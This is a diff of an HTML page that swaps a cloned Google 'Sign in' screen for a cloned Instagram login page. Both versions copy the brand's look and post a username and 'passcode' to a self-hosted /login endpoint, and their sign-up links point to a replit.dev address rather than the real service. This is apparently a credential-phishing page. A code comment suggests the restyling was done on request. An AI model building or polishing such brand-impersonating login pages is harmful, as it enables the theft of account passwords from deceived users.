@@ -1,194 +1,175 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Sign in – Google</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
 
-<style>
-* {
-  box-sizing: border-box;
-  font-family: Arial, Helvetica, sans-serif;
-}
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
 
-body {
-  margin: 0;
-  background: #f2f2f2;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-}
+    body {
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-size: 14px;
+    }
 
-/* Card */
-.container {
-  background: #fff;
-  width: 360px;
-  padding: 40px 30px;
-  border-radius: 8px;
-  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-}
+    .container {
+      background-color: #111;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 350px;
+      padding: 40px 40px 30px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.05);
+    }
 
-/* Google logo text */
-.logo {
-  text-align: center;
-  font-size: 26px;
-  margin-bottom: 10px;
-}
+    .logo {
+      width: 180px;
+      height: auto;
+      margin-bottom: 30px;
+      user-select: none;
+      -webkit-user-drag: none;
+      filter: invert(1);
+    }
 
-.logo span:nth-child(1){color:#4285F4;}
-.logo span:nth-child(2){color:#EA4335;}
-.logo span:nth-child(3){color:#FBBC05;}
-.logo span:nth-child(4){color:#4285F4;}
-.logo span:nth-child(5){color:#34A853;}
-.logo span:nth-child(6){color:#EA4335;}
+    input[type="text"],
+    input[type="Password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: none;
+      border-radius: 4px;
+      background-color: #1c1c1c;
+      color: #fff;
+      font-size: 14px;
+    }
 
-h1 {
-  font-size: 22px;
-  font-weight: normal;
-  text-align: center;
-  margin: 10px 0 5px;
-}
+    input[type="text"]::placeholder,
+    input[type="Password"]::placeholder {
+      color: #888;
+    }
 
-.sub {
-  text-align: center;
-  color: #5f6368;
-  font-size: 14px;
-  margin-bottom: 25px;
-}
+    input[type="text"]:focus,
+    input[type="Password"]:focus {
+      outline: none;
+      background-color: #222;
+    }
 
-/* Input */
-.input-group {
-  position: relative;
-  margin-top: 20px;
-}
+    input[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      background-color: #405de6;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.3s ease;
+    }
 
-input {
-  width: 100%;
-  padding: 14px 10px;
-  border: 1px solid #dadce0;
-  border-radius: 4px;
-  font-size: 16px;
-  outline: none;
-}
+    input[type="submit"]:hover {
+      background-color: #3142c4;
+    }
 
-input:focus {
-  border: 2px solid #1a73e8;
-}
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+      color: #888;
+      font-size: 12px;
+    }
 
-label {
-  position: absolute;
-  left: 10px;
-  top: 14px;
-  color: #5f6368;
-  font-size: 16px;
-  background: white;
-  padding: 0 5px;
-  transition: 0.2s ease;
-  pointer-events: none;
-}
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #333;
+      margin: 0 10px;
+    }
 
-input:focus + label,
-input:not(:placeholder-shown) + label {
-  top: -8px;
-  font-size: 12px;
-  color: #1a73e8;
-}
+    .facebook-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #1877f2;
+      font-weight: 600;
+      margin-bottom: 15px;
+      cursor: pointer;
+      text-decoration: none;
+      font-size: 14px;
+    }
 
-/* Links */
-.link {
-  display: inline-block;
-  margin-top: 10px;
-  color: #1a73e8;
-  font-size: 14px;
-  text-decoration: none;
-}
+    .facebook-login img {
+      width: 18px;
+      height: 18px;
+      margin-right: 8px;
+      filter: invert(19%) sepia(88%) saturate(3554%) hue-rotate(203deg) brightness(96%) contrast(101%);
+    }
 
-.link:hover {
-  text-decoration: underline;
-}
+    .forgot-password {
+      color: #999;
+      font-size: 13px;
+      text-decoration: none;
+      margin-bottom: 15px;
+      display: inline-block;
+    }
 
-/* Bottom text */
-.info {
-  margin-top: 25px;
-  font-size: 13px;
-  color: #5f6368;
-}
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
 
-.info a {
-  color: #1a73e8;
-  text-decoration: none;
-}
+    .footer {
+      margin-top: 10px;
+      font-size: 12px;
+      color: #888;
+    }
 
-/* Actions */
-.actions {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-top: 30px;
-}
+    .signup-link {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+    }
 
-.create {
-  color: #1a73e8;
-  font-size: 14px;
-  text-decoration: none;
-}
-
-button {
-  background: #1a73e8;
-  color: #fff;
-  border: none;
-  padding: 10px 20px;
-  border-radius: 4px;
-  cursor: pointer;
-  font-weight: 500;
-}
-
-button:hover {
-  background: #1669c1;
-}
-</style>
+    .signup-link:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
-
 <body>
+  <div class="container">
+    <img src="instagram-text-icon.svg" alt="Instagram Text Logo" class="logo" />
 
-<div class="container">
+    <form action="/login" method="POST">
+      <input type="text" name="username" placeholder="Phone number, Email or Username" required />
+      <input type="password" name="passcode" placeholder="Passcode" required />
+      <input type="submit" value="Log In" />
+    </form>
 
-  <div class="logo">
-    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    <div class="divider">OR</div>
+
+    <a href="#" class="facebook-login">
+      <img src="facebook-icon1.svg" alt="Facebook Logo" /> Log in with Facebook
+    </a>
+
+    <a href="#" class="forgot-password">Forgot password?</a>
+
+    <div class="footer">
+      Don't have an account? 
+      <a href="https://3039e9e2-3fcb-4591-9642-c447fc3ced90-00-1lclvursct2nf.sisko.replit.dev/" class="signup-link">Sign Up</a>
+    </div>
   </div>
-
-  <h1>Sign in</h1>
-  <div class="sub">Use your Google Account</div>
-
-  <!-- YOUR ORIGINAL FORM (kept intact logic) -->
-  <form action="/login" method="POST">
-
-    <div class="input-group">
-      <input type="text" name="username" placeholder=" " required>
-      <label>Email or phone</label>
-    </div>
-
-    <a href="#" class="link">Forgot email?</a>
-
-    <div class="input-group">
-      <input type="password" name="passcode" placeholder=" " required>
-      <label>Enter your password</label>
-    </div>
-
-    <div class="info">
-      Not your device? Use Guest mode to sign in privately.
-      <a href="#">Learn more</a>
-    </div>
-
-    <div class="actions">
-      <a href="https://3039e9e2-3fcb-4591-9642-c447fc3ced90-00-1lclvursct2nf.sisko.replit.dev/" class="create">Create account</a>
-      <button type="submit">Next</button>
-    </div>
-
-  </form>
-
-</div>
-
 </body>
 </html>
